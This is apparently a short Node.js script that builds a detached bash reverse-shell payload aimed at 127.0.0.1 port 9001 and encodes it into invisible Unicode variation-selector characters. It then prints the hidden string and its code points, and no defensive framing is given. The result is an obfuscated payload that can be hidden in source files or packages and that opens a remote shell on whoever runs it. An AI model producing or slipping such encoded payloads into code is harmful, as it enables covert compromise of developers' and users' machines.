const payload = `(()=>{const{spawn}=require('child_process');const p=spawn('bash',['-c','bash -i >& /dev/tcp/127.0.0.1/9001 0>&1'],{detached:true,stdio:'ignore'});p.unref()})()`;

function EncodeToPUA(bytes) {
    return [...bytes].map(b => {
        if (b < 16) {
            return String.fromCodePoint(0xFE00 + b);
        } else {
            return String.fromCodePoint(0xE0100 + (b - 16));
        }
    }).join('');
}

const bytes = Buffer.from(payload, 'utf-8');
const encodedPayload = EncodeToPUA(bytes);

console.log("Encoded payload:");
console.log("----------------");
console.log(encodedPayload);
console.log("----------------");
console.log("Codepoints (hex):", [...encodedPayload].map(c => 'U+' + c.codePointAt(0).toString(16).toUpperCase().padStart(4, '0')));
